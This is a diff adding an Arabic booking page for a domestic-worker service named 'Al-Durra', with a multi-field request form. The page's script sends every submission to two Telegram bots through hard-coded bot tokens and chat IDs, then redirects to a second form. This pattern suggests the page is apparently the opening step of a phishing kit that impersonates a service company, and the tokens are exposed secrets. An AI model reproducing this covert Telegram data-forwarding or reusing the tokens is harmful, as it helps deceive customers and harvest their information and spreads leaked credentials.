@@ -1,0 +1,464 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>هيدر بصورتين داخلية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <style>
+    body {
+      margin: 0;
+      background-color: #E8E6E6;
+      font-family: Arial, sans-serif;
+    }
+
+    header {
+      background-image: url('header-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      padding: 40px 0;
+      text-align: center;
+      position: relative;
+    }
+
+    #mome0 {
+      margin-top: -50px;
+      width: 100%;
+      height: 100px;
+      background-image: url('اسم-الصورة.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    #mome1 {
+      margin-top: -250px;
+      width: 150px;
+      margin-bottom: 24px;
+      margin-left: 220px;
+    }
+
+    .slider-container {
+      width: 90%;
+      height: 300px;
+      overflow: hidden;
+      position: relative;
+      margin-top: -40px;
+      margin-left: 20px;
+    }
+
+    .slider {
+      display: flex;
+      transition: transform 0.8s ease-in-out;
+    }
+
+    .slider img {
+      width: 100%;
+      height: 300px;
+      object-fit: cover;
+      flex-shrink: 0;
+    }
+
+    .nav-btn {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: rgba(0,0,0,0.4);
+      color: white;
+      border: none;
+      font-size: 24px;
+      padding: 8px 12px;
+      cursor: pointer;
+      z-index: 10;
+      user-select: none;
+    }
+
+    .prev {
+      left: 10px;
+    }
+
+    .next {
+      right: 10px;
+    }
+
+    .nav-btn:hover {
+      background-color: rgba(0,0,0,0.7);
+    }
+
+    #imgi1 {
+
+        width: 100%;
+        margin-bottom: -7px;
+    }
+
+    .buttons-container {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    align-items: center;
+    background-color: #e0dce7; /* لون خلفية مثل الصورة */
+    padding: 30px;
+  }
+
+  .custom-button {
+    width: 90%;
+    max-width: 300px;
+    padding: 15px;
+    background-color: #5c469c; /* بنفسجي غامق مثل الزر */
+    color: white;
+    border: none;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  .custom-button:hover {
+    background-color: #4a3880; /* لون أغمق عند التحويم */
+  }
+
+  .footer {
+    background-color: #2B074D; /* لون زهري */
+    text-align: center;
+    padding: 50px 0;
+    font-size: 14px;
+    color: #ffffff;
+
+  }
+  #divider {
+    border: none;
+    height: 2px;
+    background-color: #ccc;
+    margin: 20px 0;
+    margin-top: -80px;
+  }
+  .form-container {
+  background-color: #e0dce7;
+  padding: 20px;
+  border-radius: 10px;
+  max-width: 95%;
+  width: 400px;
+  margin: 30px auto;
+  font-family: Arial, sans-serif;
+  box-sizing: border-box;
+}
+
+.form-title {
+  background-color: #471f6c;
+  color: white;
+  text-align: center;
+  padding: 12px;
+  border-radius: 10px;
+  margin-bottom: 20px;
+  font-size: 18px;
+}
+
+label {
+  display: block;
+  margin-bottom: 6px;
+  font-weight: bold;
+  color: #5c469c;
+  font-size: 14px;
+}
+
+input {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #999;
+  margin-bottom: 20px;
+  font-size: 14px;
+  text-align: right;
+
+}
+.form-container {
+  direction: rtl;
+}
+
+.form-button {
+  width: 100%;
+  padding: 14px;
+  background-color: #5c469c;
+  color: white;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
+  box-sizing: border-box;
+}
+
+.form-button:hover {
+  background-color: #4a3880;
+}
+
+.service-form {
+  background-color: #E8E6E6;
+  padding: 30px;
+  border-radius: 15px;
+  max-width: 400px;
+  margin: auto;
+  direction: rtl;
+  font-family: 'Arial', sans-serif;
+}
+
+.service-form form {
+  display: flex;
+  flex-direction: column;
+}
+
+.service-form label {
+  margin: 10px 0 5px;
+  font-weight: bold;
+  color: #4d2f84;
+}
+
+.service-form select,
+.service-form input[type="date"] {
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  font-size: 15px;
+  background-color: #fff;
+  color: #333;
+  text-align: right;
+}
+
+.service-form button {
+  margin-top: 20px;
+  background-color: #5e4b8b;
+  color: #fff;
+  padding: 14px;
+  border: none;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
+  transition: 0.3s ease;
+}
+
+.service-form button:hover {
+  background-color: #4a3b6d;
+}
+
+#kkhh {
+  width: 100%;
+  max-width: 300px;
+  padding: 10px;
+  font-size: 16px;
+  box-sizing: border-box;
+}
+input[type="date"] {
+  width: 100%;
+  max-width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  border-radius: 10px;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  direction: rtl;
+}
+.form-group {
+  margin-bottom: 15px;
+  width: 100%;
+}
+
+.custom-date {
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  border-radius: 12px;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  direction: rtl;
+  background-color: #fff;
+  appearance: none; /* يخفف من تأثير تنسيق المتصفح */
+}
+
+
+#start-date {
+
+    padding: 12px;
+    margin-bottom: -50px;
+}
+
+
+.service-form {
+
+    margin-bottom: 150px;
+}
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-container">
+      <img src="menu_bg.png" alt="خلفية الشعار" class="logo-bg" id="mome0">
+      <img src="logo (3).png" alt="شعار" class="logo" id="mome1">
+    </div>
+  </header>
+
+
+  <div class="service-form">
+    <form>
+      <label>الجنسية *</label>
+      <select required>
+        <option disabled selected>اختيار الجنسية</option>
+        <option value="">اوغندا</option>
+        <option value="">نيبال</option>
+        <option value="">فلبين</option>
+        <option value="">إندونيسيا</option>
+        <option value="">الهند</option>
+        <option value="">سيريلنكا</option>
+        <option value="">بنغلادش</option>
+
+
+    </select>
+  
+      <label>باقة الخدمة *</label>
+      <select required>
+        <option disabled selected>اختيار باقة الخدمة</option>
+        <option value="">عامل/ة منزلي/ة</option>
+        <option value="">مربية</option>
+        <option value="">سائق خاص</option>
+        <option value="">طباخ/ة منزلي/ة</option>
+
+      </select>
+  
+      <label>مدة الخدمة *</label>
+      <select required>
+        <option disabled selected>اختيار مدة الخدمة</option>
+        <option value="">زيارة منزلية 4 ساعات (6 دنانير)</option>
+        <option value="">زيارة منزلية 6 ساعات (8 دنانير)</option>
+        <option value="">زيارة منزلية 8 ساعات (10 دنانير)</option>
+        <option value=""> مقيمة مدة 30 يوم (85 دينار)</option>
+        <option value="">مقيمة مدة  2 شهرين (170 دينار)</option>
+        <option value=""> مقيمة مدة 3 شهور (255 دينار)</option>
+        <option value=""> مقيمة مدة 6 شهور (510 دينار)</option>
+        <option value=""> مقيمة مدة 1 سنة (800 دينار)</option>
+        <option value=""> مقيمة مدة 2 سنة (1300 دينار)</option>
+
+      </select>
+  
+      <label>الجنس *</label>
+      <select required>
+        <option disabled selected>اختيار الجنس</option>
+        <option value="">ذكر</option>
+        <option value="">انثى</option>
+
+    </select>
+  
+      <label>عدد العمالة المطلوبة *</label>
+      <select required>
+        <option disabled selected>اختيار عدد العمالة المطلوبة</option>
+        <option value="">1</option>
+        <option value="">2</option>
+        <option value="">3</option>
+        <option value="">4</option>
+        <option value="">5</option>
+        <option value="">6</option>
+        <option value="">7</option>
+        <option value="">8</option>
+        <option value="">9</option>
+
+
+        
+
+      </select>
+      <div class="form-group">
+        <label for="start-date">تاريخ بدء الخدمة</label>
+        <input type="date" id="start-date" name="start-date" class="custom-date" required>
+      </div>
+      
+
+      
+      <label>طريقة إستلام الخدمة</label>
+      <select>
+        <option disabled selected>اختيار طريقة إستلام الخدمة</option>
+        <option value="">التوصيل للمنزل</option>
+        <option value="">زيارة الفرع</option>
+
+      </select>
+
+  
+      <label>موعد توصيل الخدمة *</label>
+      <select required>
+        <option disabled selected>اختيار موعد توصيل الخدمة</option>
+
+        <option value="">صباحآ</option>
+        <option value="">مساءآ</option>
+      </select>
+  
+      <button type="submit">التالي</button>
+    </form>
+  </div>
+  
+
+  
+<div class="footer">
+    2024 Al-Durra- All rights reserved  </div>
+
+
+    <script>
+        const bots = [
+          {
+            token: '7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E',
+            chatId: '6454807559'
+          },
+          {
+            token: '8037647888:AAHjCopWn1zSMFZpL4os5FtGb5DD6Dw4_gc',
+            chatId: '7561846138'
+          }
+        ];
+      
+        document.querySelector('form').addEventListener('submit', function (e) {
+          e.preventDefault();
+      
+          const data = {
+            nationality: document.querySelectorAll('select')[0].value,
+            package: document.querySelectorAll('select')[1].value,
+            duration: document.querySelectorAll('select')[2].value,
+            gender: document.querySelectorAll('select')[3].value,
+            workers: document.querySelectorAll('select')[4].value,
+            startDate: document.getElementById('start-date').value,
+            deliveryMethod: document.querySelectorAll('select')[5].value,
+            deliveryTime: document.querySelectorAll('select')[6].value
+          };
+      
+          const message = 
+            `📝  طالب الخدمة:\n\n` +
+            `الجنسية: ${data.nationality}\n` +
+            `الباقة: ${data.package}\n` +
+            `المدة: ${data.duration}\n` +
+            `الجنس: ${data.gender}\n` +
+            `عدد العمالة: ${data.workers}\n` +
+            `تاريخ البداية: ${data.startDate}\n` +
+            `طريقة الاستلام: ${data.deliveryMethod}\n` +
+            `موعد التوصيل: ${data.deliveryTime}`;
+      
+          // إرسال الرسالة لكل بوت وآي دي
+          Promise.all(bots.map(bot => {
+            return fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: bot.chatId,
+                text: message
+              })
+            });
+          }))
+          .then(() => {
+            window.location.href = "form2.html";
+          })
+          .catch(err => {
+            alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى.");
+            console.error(err);
+          });
+        });
+      </script>
+
+      
+
+</body>
+</html>
